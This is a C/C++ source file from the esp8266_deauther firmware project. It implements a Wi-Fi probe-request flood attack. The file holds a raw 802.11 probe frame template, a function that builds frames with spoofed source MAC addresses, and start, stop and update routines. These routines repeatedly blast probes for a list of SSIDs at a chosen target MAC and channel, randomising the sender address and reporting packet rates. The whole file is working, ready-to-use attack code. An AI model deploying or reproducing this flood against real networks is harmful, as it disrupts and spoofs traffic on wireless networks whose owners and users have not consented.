/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#pragma once

// ========== PROBE PACKET ========== //
uint8_t probe_pkt[] = {
    /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence number (handled by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                         // Tag: Set SSID length, Tag length: 32
    /* 26 -    */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*    - 57 */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /* 58 - 59 */ 0x01, 0x08,                         // Tag Number: Supported Rates (1), Tag length: 8
    /*    60   */ 0x82,                               // 1(B)
    /*    61   */ 0x84,                               // 2(B)
    /*    62   */ 0x8b,                               // 5.5(B)
    /*    63   */ 0x96,                               // 11(B)
    /*    64   */ 0x24,                               // 18
    /*    65   */ 0x30,                               // 24
    /*    66   */ 0x48,                               // 36
    /*    67   */ 0x6c                                // 54
};

// ========== ATTACK DATA ========== //
typedef struct probe_attack_data_t {
    SortedStringList ssids;
    uint8_t          to[6];
    uint8_t          ch;
    unsigned long    timeout;
    unsigned long    start_time;
    unsigned long    output_time;
    unsigned long    pkts_sent;
    unsigned long    pkts_per_second;
    unsigned long    pkt_time;
    unsigned long    pkt_interval;
    bool             silent;
} probe_attack_data_t;

probe_attack_data_t probe_data;

// ========== SEND FUNCTION ========== //
bool send_probe(uint8_t ch, uint8_t* from, uint8_t* to, const char* ssid) {
    size_t ssid_len = strlen(ssid);

    if (ssid_len > 32) ssid_len = 32;
    uint16_t pkt_len = 0;

    uint8_t frame[68];

    // MAC header
    memcpy(&frame[0], &probe_pkt[0], 4);
    memcpy(&frame[4], to, 6);
    memcpy(&frame[10], from, 6);
    memcpy(&frame[16], to, 6);
    pkt_len += 4 + 6 + 6 + 6;

    // Fixed parameters
    memcpy(&frame[22], &probe_pkt[22], 2);
    pkt_len += 2;

    // SSID
    frame[pkt_len]   = 0x00;
    frame[pkt_len+1] = ssid_len;
    memcpy(&frame[pkt_len+2], ssid, ssid_len);
    pkt_len += 2 + ssid_len;

    // Supported Rates
    memcpy(&frame[pkt_len], &probe_pkt[58], 10);
    pkt_len += 10;

    return send(ch, frame, pkt_len);
}

// ========== ATTACK FUNCTIONS ========== //
void startProbe(StringList& ssid_list, uint8_t* to, uint8_t ch, unsigned long timeout, bool silent) {
    { // Error checks
        if (ssid_list.size() == 0) {
            debugln("ERROR: No SSIDs specified");
            return;
        }

        if (!to) {
            debugln("ERROR: MAC address not specified");
            return;
        }

        if ((ch < 1) || (ch > 14)) {
            debugln("ERROR: Invalid channel");
            return;
        }
    }

    stopProbe();

    { // Output
        debug("Sending probes to ");
        debug(strh::mac(to));
        debug(" on channel ");
        debugln(ch);

        debugln("SSIDs:");

        while (ssid_list.available()) {
            debugln(ssid_list.iterate());
        }

        if (timeout > 0) {
            debug("Stop after ");
            debug(timeout/1000);
            debugln(" seconds");
        }
        debugln("Type 'stop' to stop the attack");
    }

    probe_data.ssids.moveFrom(ssid_list);
    memcpy(probe_data.to, to, 6);
    probe_data.ch              = ch;
    probe_data.timeout         = timeout;
    probe_data.start_time      = millis();
    probe_data.output_time     = millis();
    probe_data.pkts_sent       = 0;
    probe_data.pkts_per_second = 0;
    probe_data.pkt_time        = millis();
    probe_data.pkt_interval    = 100;
    probe_data.silent          = silent;
}

void stopProbe() {
    if (probe_data.ssids.size() > 0) {
        probe_data.pkts_sent += probe_data.pkts_per_second;
        probe_data.ssids.clear();

        debug("Probe attack stopped. Sent ");
        debug(probe_data.pkts_sent);
        debugln(" packets.");
    }
}

void updateProbe() {
    probe_attack_data_t& b = probe_data;

    if (b.ssids.size() > 0) {
        if (((b.timeout > 0) && (millis() - b.start_time > b.timeout))) {
            stopProbe();
            return;
        }

        if (millis() - b.pkt_time >= b.pkt_interval) {
            b.pkt_time = millis();
            b.ssids.begin();

            uint8_t from[6];
            vendor::randomize(from);

            for (int i = 0; i<b.ssids.size(); ++i) {
                String ssid = b.ssids.iterate();

                b.pkts_per_second += send_probe(b.ch, from, b.to, ssid.c_str());
                delay(1);
            }
        }

        if (!b.silent && (millis() - b.output_time >= 1000)) {
            b.pkts_sent += b.pkts_per_second;

            debug("Probe attack: ");
            debug(b.pkts_per_second);
            debug(" pkts/s, ");
            debug(b.pkts_sent);
            debugln(" total");

            b.output_time = millis();

            b.pkts_per_second = 0;
        }
    }
}